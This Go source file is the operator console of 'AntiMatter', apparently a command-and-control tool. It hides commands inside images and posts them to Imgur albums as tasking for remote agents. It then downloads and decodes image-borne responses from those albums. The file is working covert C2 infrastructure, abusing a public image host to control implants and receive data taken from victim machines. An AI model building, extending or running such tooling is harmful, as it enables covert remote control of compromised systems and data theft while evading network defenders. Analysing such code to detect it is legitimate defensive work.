// TODO:
// Error handling
// Display walkthroughs for each module
// Set up mysql and configure it for multiple agent handlings
// Fix some of the verbiage on the modules so that it makes a bit more sense
// Maybe some autocomplete and up arrow stuff

package main

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sort"
	"strings"

	"github.com/AntiMatter/cmd"
	"github.com/fatih/color"
	"github.com/jwangsadinata/go-multimap/slicemultimap"
	"github.com/manifoldco/promptui"
)

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

// Global map for the Image module
var imageOptions = map[string]string{"Command": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": ""}

// Global map for the Album module
var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": "", "Album Delete-Hash": ""}

// Global map for the Task module
var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "DeleteHash": "", "Description": "", "ClientID": ""}

// Global map for the Response module
var responseOptions = map[string]string{"AlbumID": "", "ClientID": ""}

// Global multimap for holding several different types of variables returned from the imgur API
var imgurItems = slicemultimap.New() // empty

// yesNo() is just a function that helps ask the user yes or no lmao
func yesNo() bool {
	prompt := promptui.Select{
		Label: "Would you like to upload most recently created image to this album?[Yes/No]",
		Items: []string{"Yes", "No"},
	}
	_, result, err := prompt.Run()
	if err != nil {
		log.Fatalf("Prompt failed %v\n", err)
	}
	return result == "Yes"
}

func main() {
	for {
		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit", "Init"}
		validate := func(input string) error {
			// _, err := strconv.ParseFloat(input, 64)
			found := validateOptions(options, input)

			if !found {
				return errors.New("Invalid Option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		prompt := promptui.Prompt{
			Label:     "AntiMatter >>",
			Templates: templates,
			Validate:  validate,
		}

		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		//fmt.Printf("You chose %q\n", result)

		if strings.EqualFold(result, "options") {
			fmt.Println("")
			fmt.Println("Valid Commands		Description")
			fmt.Println("---------------         ------------") // Literally just aethetic
			fmt.Println(" ")
			fmt.Println(" Image		Create an Image for agent tasking")
			fmt.Println(" Album		Create an Album for agent responses")
			fmt.Println(" Task		Create Tasking for agent")
			fmt.Println(" List		List images, albums, agents, and tasks")
			fmt.Println(" Response	Search for any pending responses within an album")
			fmt.Println(" Options	List out different options/modules you can choose from")
			fmt.Println(" Init		Have the server walk you through filling in the options you need")
			fmt.Println(" Exit		Exit program")
			fmt.Println("")
		}

		if strings.EqualFold(result, "exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Image") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Image >> ")
				color.Unset()
				text, _ := reader.ReadString('\n')

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					// Check to see if this value is set from the Album module
					if val, ok := albumOptions["AlbumID"]; ok {
						imageOptions["AlbumID"] = val
					}
					for key, value := range imageOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")
				} else if strings.Contains(text, "set") {

					// TODO: If this isn't set it breaks, handle that
					if strings.Contains(text, "command") {
						command := strings.Split(text, "command ")
						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "base-image") {
						baseImage := strings.Split(text, "base-image ")
						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "new-filename") {
						newFilename := strings.Split(text, "new-filename ")
						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						imageOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "album-id") {
						albumID := strings.Split(text, "album-id ")
						imageOptions["AlbumID"] = strings.Replace(strings.Join(albumID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "go") {
					cmd.CreateImage(imageOptions["Command"], imageOptions["BaseImage"], imageOptions["NewFilename"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}
		}

		if strings.EqualFold(result, "Album") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Album > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["ClientId"]; ok {
					albumOptions["Client-ID"] = val
				}

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["AlbumId"]; ok {
					albumOptions["AlbumID"] = val
				}

				// Check to see if this value was set in the Image module
				if val, ok := imageOptions["ClientID"]; ok {
					albumOptions["Client-ID"] = val
				}

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					for key, value := range albumOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}

					fmt.Println("\n")
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						title := strings.Split(text, "title ")
						albumOptions["Title"] = strings.Replace(strings.Join(title[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						albumOptions["Client-ID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "list") {
					fmt.Println(color.CyanString("AlbumHash:"), albumOptions["Delete-Hash"], "|", color.CyanString("Album ID:"), albumOptions["AlbumID"])

				} else if strings.Contains(text, "go") {
					albumID, deletehash := cmd.CreateAlbum(albumOptions["Title"], albumOptions["Client-ID"])
					albumOptions["AlbumID"] = albumID.(string)
					albumOptions["Album Delete-Hash"] = deletehash.(string)

				} else if strings.Contains(text, "exit") {
					break
				}

			}

		}
		if strings.EqualFold(result, "Task") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Task > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					// Check to see if this value was set in the Image module
					if val, ok := imageOptions["ClientID"]; ok {
						taskOptions["ClientID"] = val
					}
					// Check to see if this value was set in the Album module (it should have been, add error handling if not)
					if val, ok := albumOptions["Delete-Hash"]; ok {
						taskOptions["DeleteHash"] = val
					}

					for key, value := range taskOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")

				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "title") {
						taskTitle := strings.Split(text, "title ")
						taskOptions["Title"] = strings.Replace(strings.Join(taskTitle[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "tasking-image") {

						taskImage := strings.Split(text, "tasking-image ")

						// Open local image file
						f, _ := os.Open("./" + strings.Replace(strings.Join(taskImage[1:], ""), "\n", "", -1))

						reader := bufio.NewReader(f)
						content, _ := ioutil.ReadAll(reader)
						// Convert image file data to base64
						encoded := base64.StdEncoding.EncodeToString(content)
						taskOptions["TaskingImage"] = encoded

					} else if strings.Contains(text, "delete-hash") {
						deleteHash := strings.Split(text, "delete-hash ")
						taskOptions["DeleteHash"] = strings.Replace(strings.Join(deleteHash[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "description") {
						taskDescrip := strings.Split(text, "description ")
						taskOptions["Description"] = strings.Replace(strings.Join(taskDescrip[1:], ""), "\n", "", -1)

					} else if strings.Contains(text, "client-id") {
						clientID := strings.Split(text, "client-id ")
						taskOptions["ClientID"] = strings.Replace(strings.Join(clientID[1:], ""), "\n", "", -1)

					}

				} else if strings.Contains(text, "go") {
					imageID, deletehash := cmd.UploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["AlbumID"], taskOptions["Description"], taskOptions["ClientID"])

					imgurItems.Put("ImageID", imageID)
					imgurItems.Put("ImageDeleteHash", deletehash)

					// Here ask the user if they want to upload the previously created image to this new album

					confirmAdd := yesNo()
					if confirmAdd {
						cmd.AddImage(albumOptions["Album Delete-Hash"], imageOptions["ClientID"], deletehash.(string))
						fmt.Println(color.GreenString("[+]"), "Successfully upload image to Album:", albumOptions["Title"])
					}
					//fmt.Println(success, "|", status)

				} else if strings.Contains(text, "exit") {
					break
				} else if strings.Contains(text, "list") {
					values := imgurItems.Values() // Grabs values in random order

					// Workaround to make sure we grab values in a sorted order every time
					tmp := make([]string, len(values))
					count := 0
					for _, value := range values {
						tmp[count] = value.(string)
						count++
					}
					sort.Strings(tmp)

					// DeleteHash == 15 bytes long
					// ImageID == 7 bytes long

					// Check the lengths to appropriately label values
					for _, items := range tmp {
						if len(items) == 15 {
							fmt.Println("\n\n", color.GreenString("Image Delete Hash is:"), items)
						} else if len(items) == 7 {
							fmt.Println(color.GreenString("Image ID is:"), items, "\n\n")
						}
					}

				}

			}

		}
		/*
		 My thought right now is that this will look for any descriptions that mention the word "response"
		 For right now, and then maybe get a big dict of words that will mean specific things

		 Beta build:
		 1. Search albumOptions["AlbumID"] using API for images
		 2. Search through their descriptions to see if any say "response" in them
		 3. If they do, pull the link from the data and grab that image and decode it
		 4. Store the decoded info into resonseOptions["Response-Data"]
		 5. Give to user



		*/
		if strings.EqualFold(result, "Response") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Response > ")
				color.Unset()
				// Had to do this since case sensitivity is dumb in golang
				initialText, _ := reader.ReadString('\n')
				text := strings.ToLower(initialText)

				if val, ok := albumOptions["AlbumID"]; ok {
					responseOptions["AlbumID"] = val
				}

				if val, ok := albumOptions["Client-ID"]; ok {
					responseOptions["ClientID"] = val

				}

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")

					for key, value := range responseOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
					fmt.Println("\n")

				} else if strings.Contains(text, "check") {
					albumID := responseOptions["AlbumID"]
					clientID := responseOptions["ClientID"]

					linkImage := cmd.GetAlbumImages(albumID, clientID)

					response, e := http.Get(linkImage.(string))
					if e != nil {
						log.Fatal(e)
					}
					defer response.Body.Close()

					//open a file for writing
					// Should probably have the user define what and where to call this
					file, err := os.Create("/tmp/asdf.jpg")
					if err != nil {
						log.Fatal(err)
					}
					defer file.Close()

					// Use io.Copy to just dump the response body to the file. This supports huge files
					_, err = io.Copy(file, response.Body)
					if err != nil {
						log.Fatal(err)
					}
					fmt.Println("Get response: Success!\n")
					fmt.Println(color.GreenString("Response") + ":\n")

					cmd.DecodeImage()

				} else if strings.Contains(text, "exit") {
					break
				}
			}
		}

		if strings.EqualFold(result, "Init") {
			fmt.Println("Starting the simulation for you...")
			fmt.Println("This will walk you through the options that you need to get this started")

		}
		if strings.EqualFold(result, "") {
		}
	}
}
